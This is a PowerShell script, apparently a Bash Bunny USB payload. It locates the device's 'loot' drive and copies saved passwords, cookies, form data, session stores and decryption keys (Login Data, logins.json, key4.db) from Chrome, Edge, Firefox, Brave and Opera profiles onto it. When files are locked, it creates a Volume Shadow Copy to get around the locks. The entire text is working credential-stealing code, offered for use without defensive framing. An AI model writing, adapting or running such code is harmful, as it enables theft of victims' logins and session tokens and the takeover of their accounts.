# --- Detect Bash Bunny drive ---
$usbDrive = Get-WmiObject Win32_LogicalDisk |
    Where-Object {
        $_.DriveType -eq 2 -and (Test-Path "$($_.DeviceID)\loot")
    } |
    Select-Object -ExpandProperty DeviceID -First 1

if (-not $usbDrive) {
    Write-Output "[-] ERROR: Bash Bunny loot drive not found."
    exit
}

Write-Output "[+] Bash Bunny detected on drive $usbDrive"

# Normalized loot path
$loot = Join-Path $usbDrive "loot\Browser_Data"

# Ensure loot folder exists
New-Item -ItemType Directory -Force -Path $loot | Out-Null
Write-Output "[+] Loot folder: $loot"


#############################################
#   Function: Safe Copy with Shadow Fallback
#############################################

function Copy-Safe {
    param(
        [string]$source,
        [string]$dest
    )

    if (!(Test-Path $source)) {
        return
    }

    # -------------------------
    # Normal Copy Attempt
    # -------------------------
    try {
        if (Test-Path $source -PathType Container) {
            # Folder — recursive copy
            Copy-Item -Path $source -Destination $dest -Recurse -Force -ErrorAction Stop
        }
        else {
            # File — normal copy
            Copy-Item -Path $source -Destination $dest -Force -ErrorAction Stop
        }

        Write-Output "[+] Copied: $source"
        return
    }
    catch {
        Write-Output "[-] Normal copy failed for $source"
    }


    # -------------------------
    # Shadow Copy Fallback
    # -------------------------
    Write-Output "[*] Attempting shadow copy..."

    $shadowScript = @"
SET CONTEXT CLIENT ACCESSIBLE
BEGIN BACKUP
ADD VOLUME C: ALIAS vol1
CREATE
END BACKUP
"@

    $shadowFile = "$env:TEMP\shadow.txt"
    $shadowScript | Out-File $shadowFile -Encoding ASCII

    diskshadow /s $shadowFile | Out-Null

    # Locate created shadow copy
    $shadow = (vssadmin list shadows | Select-String "Shadow Copy Volume:").Line
    if ($shadow -match "Shadow Copy Volume:\s+(.*)$") {

        $shadowPath = $matches[1].Trim()
        $shadowSource = $source.Replace("C:", $shadowPath)

        try {
            if (Test-Path $shadowSource -PathType Container) {
                Copy-Item $shadowSource $dest -Recurse -Force
            }
            else {
                Copy-Item $shadowSource $dest -Force
            }

            Write-Output "[+] Shadow copy successful for $source"
        }
        catch {
            Write-Output "[-] Shadow copy failed for $source"
        }
    }
}


#############################################
#          Chrome Collection
#############################################

$chromeUser = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$chromeDest = Join-Path $loot "Chrome"
New-Item -ItemType Directory -Force -Path $chromeDest | Out-Null

# Loop all profiles (Default, Profile 1, Profile 2, etc.)
foreach ($profile in Get-ChildItem $chromeUser -Directory) {

    $pDest = Join-Path $chromeDest $profile.Name
    New-Item -ItemType Directory -Force -Path $pDest | Out-Null

    # Files to copy
    $files = @(
        "History",
        "Cookies",
        "Bookmarks",
        "Login Data",
        "Web Data",
        "User Data"
    )

    foreach ($f in $files) {
        $src = Join-Path $profile.FullName $f
        Copy-Safe -source $src -dest $pDest
    }

    # Folders to copy entirely
    $folders = @(
        "Cache",
        "Local Storage",
        "Extensions"
    )

    foreach ($folder in $folders) {
        $srcFolder = Join-Path $profile.FullName $folder
        $destFolder = Join-Path $pDest $folder
        Copy-Safe -source $srcFolder -dest $destFolder
    }
}
#############################################
#               Edge Collection
#############################################

$edgeUser = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
$edgeDest = Join-Path $loot "Edge"
New-Item -ItemType Directory -Force -Path $edgeDest | Out-Null

$edgeTargets = @(
    "Default\History",
    "Default\Cookies",
    "Default\Bookmarks"
)

foreach ($item in $edgeTargets) {
    $path = Join-Path $edgeUser $item
    Copy-Safe -source $path -dest $edgeDest
}


#############################################
#             Firefox Collection
#############################################

$ffBase = "$env:APPDATA\Mozilla\Firefox\Profiles"
$ffDest = Join-Path $loot "Firefox"

if (Test-Path $ffBase) {
    New-Item -ItemType Directory -Force -Path $ffDest | Out-Null

    foreach ($profile in Get-ChildItem $ffBase -Directory) {

        $pDest = Join-Path $ffDest $profile.Name
        New-Item -ItemType Directory -Force -Path $pDest | Out-Null

        # Files to copy
        $files = @(
            "places.sqlite",
            "cookies.sqlite",
            "logins.json",
            "key4.db",
            "sessionstore.jsonlz4",
            "formhistory.sqlite"
        )

        foreach ($f in $files) {
            $src = Join-Path $profile.FullName $f
            Copy-Safe -source $src -dest $pDest
        }

        # Entire storage folder (Local Storage / IndexedDB)
        $storageSrc = Join-Path $profile.FullName "storage"
        $storageDest = Join-Path $pDest "storage"
        Copy-Safe -source $storageSrc -dest $storageDest
    }
}

#############################################
#              Brave Browser
############################################

$braveUser = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
$braveDest = Join-Path $loot "Brave"
New-Item -ItemType Directory -Force -Path $braveDest | Out-Null

# Loop all profiles (Default, Profile 1, Profile 2, etc.)
foreach ($profile in Get-ChildItem $braveUser -Directory) {

    $pDest = Join-Path $braveDest $profile.Name
    New-Item -ItemType Directory -Force -Path $pDest | Out-Null

    # Files to copy
    $files = @(
        "History",
        "Cookies",
        "Bookmarks",
        "Login Data",
        "Web Data"
    )

    foreach ($f in $files) {
        $src = Join-Path $profile.FullName $f
        Copy-Safe -source $src -dest $pDest
    }

    # Folders to copy entirely
    $folders = @(
        "Cache",
        "Local Storage",
        "Extensions"
    )

    foreach ($folder in $folders) {
        $srcFolder = Join-Path $profile.FullName $folder
        $destFolder = Join-Path $pDest $folder
        Copy-Safe -source $srcFolder -dest $destFolder
    }
}

#############################################
#               Opera
############################################
$operaUser = "$env:APPDATA\Opera Software\Opera Stable"
$operaDest = Join-Path $loot "Opera"
New-Item -ItemType Directory -Force -Path $operaDest | Out-Null

# Opera typically has a single profile ("Opera Stable")
$pDest = $operaDest
New-Item -ItemType Directory -Force -Path $pDest | Out-Null

# Files to copy
$files = @(
    "History",
    "Cookies",
    "Bookmarks",
    "Login Data",
    "Web Data"
)

foreach ($f in $files) {
    $src = Join-Path $operaUser $f
    Copy-Safe -source $src -dest $pDest
}

# Folders to copy entirely
$folders = @(
    "Cache",
    "Local Storage",
    "Extensions"
)

foreach ($folder in $folders) {
    $srcFolder = Join-Path $operaUser $folder
    $destFolder = Join-Path $pDest $folder
    Copy-Safe -source $srcFolder -dest $destFolder
}

#############################################
#                Done
#############################################

Write-Output "[+] Browser artifact collection complete."
